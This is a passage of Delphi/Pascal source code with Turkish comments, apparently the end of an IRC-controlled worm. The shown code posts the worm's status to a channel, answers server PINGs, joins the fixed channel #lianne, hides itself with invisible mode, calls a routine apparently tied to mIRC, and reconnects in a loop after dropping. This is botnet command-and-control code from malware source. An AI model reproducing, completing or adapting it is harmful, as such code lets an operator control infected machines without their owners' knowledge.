       Sendstring('PRIVMSG '+mkanal+' :'+WormDurum+#13+#10);
      End;
     End;
   8:
    MircBulas;

   End;

   End;


     end; // For döngüsü end'i..
        end;   // PRIVMSG varsa'nýn END'i..


      // KANALDA VERÝLEN KOMUTLAR VE CASE SENSITIVE -END-

   //SERVER RAW - BAÐLANIRKEN...
   If Pos('PRIVMSG',Tmprcv) = 0 Then
    Begin
     If Pos('PING :', Tmprcv) <> 0 Then
      begin
       C1 := Pos('PING :',Tmprcv);
       Copytmp :=Copy(Tmprcv, C1 + 6,1000);
       Copytmp:=Copy(Copytmp,1,Pos(#13,Copytmp));
       SendString('PONG :' + Copytmp + #13+#10);  //logon to server
       // writeln('---------PING PONG---------');
       Sendstring('join #lianne'+#13+#10);   // join #1
       Sendstring('mode '+nick+' +i'+#13+#10); // invisible mode.
      End;
     If Pos('MODE '+Nick+' :',Tmprcv) <> 0 Then Sendstring('join #lianne'+#13+#10);  //join #2 , saðlam olsun..

    End;
    Buf := ''; //reset buf for properly update
   End;
    Buf := ''; //reset buf for properly update
    Concheck:=Concheck-1;
    If Concheck < 0 Then
    Begin
     Closesocket(s);
     Sleep(15000);
     Goto Dongu1;
    End;



   End.
